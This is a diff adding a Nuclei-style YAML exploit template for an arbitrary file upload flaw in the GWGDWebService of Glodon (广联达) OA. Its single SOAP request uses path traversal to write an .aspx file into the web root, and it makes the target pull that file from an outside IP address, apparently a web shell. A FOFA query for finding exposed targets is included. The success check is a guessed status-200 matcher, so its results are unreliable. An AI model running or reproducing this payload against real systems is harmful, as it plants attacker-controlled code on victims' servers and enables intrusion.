@@ -1,0 +1,21 @@
+id: poc-f682683d23955871a5c8
+info:
+  name: 广联达OAGWGDWebService存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/f682683d23955871a5c8be7496610091
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: f682683d23955871a5c8be7496610091
+    fofa: + app.name="广联达 OA"
+http:
+- raw:
+  - "POST /GB/LK/ArchiveManagement/Js/GWGDWebService.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nUser-Agent: Mozilla/5.0\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n  <soapenv:Header/>\n  <soapenv:Body>\n      <tem:GetGWGDData>\n        <!--Optional:-->\n        <tem:data>\n            <root>\n              <GWINFO>\n                  <公文标题>1</公文标题>\n\n                  <拟稿人>拟稿人</拟稿人>\n\n                  <主送单位>主送单位</主送单位>\n\n                  <主题词>主题词</主题词>\n\n                  <印发份数>1</印发份数>\n\n                  <签发日期>2022-12-07</签发日期>\n\n              </GWINFO>\n\n              <aa>\n                  <FileName>./../../../../../../../applications/gtp-default/Web/Common/768a9b.aspx</FileName>\n\n                  <DownLoadURL>http://172.245.154.22:9999/stc.aspx</DownLoadURL>\n\n              </aa>\n\n            </root>\n\n        </tem:data>\n\n      </tem:GetGWGDData>\n\n  </soapenv:Body>\n\n</soapenv:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
